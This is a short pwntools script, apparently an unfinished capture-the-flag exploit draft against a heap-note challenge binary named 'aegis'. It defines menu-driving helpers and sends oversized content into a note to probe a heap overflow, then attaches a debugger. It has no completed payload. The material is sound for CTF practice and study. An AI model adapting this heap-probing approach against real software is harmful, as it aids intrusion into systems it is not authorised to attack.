from pwn import *

p = process('./aegis')
#p = remote('111.186.63.209',6666)
elf = ELF('./aegis')
libc = ELF('./libc-2.27.so')
context.log_level = 'debug'

def create(size,content,note_id,enter=0):
    p.sendlineafter('Choice: ','1')
    p.sendlineafter('Size: ',str(size))
    if not enter :
        p.sendafter('Content: ',content)
    else :
        p.sendlineafter('Content: ',content)
    p.sendlineafter('ID: ',str(note_id))

def update_note(index,content,note_id,enter=0):
    p.sendlineafter('Choice: ','3')
    p.sendlineafter('Index: ',str(index))
    if not enter :
        p.sendafter('New Content: ',content)
    else :
        p.sendlineafter('New Content: ',content)
    p.sendlineafter('New ID: ',str(note_id))

def show_note(index):
    p.sendlineafter('Choice: ','2')
    p.sendlineafter('Index: ',str(index))

def delete_note(index):
    p.sendlineafter('Choice: ','4')
    p.sendlineafter('Index: ',str(index))

create(24,'A'*16,10)
update_note(0,'A'*17,1)
update_note(0,'A'*8,2,1)
gdb.attach(p)
#delete_note(0)

p.interactive()
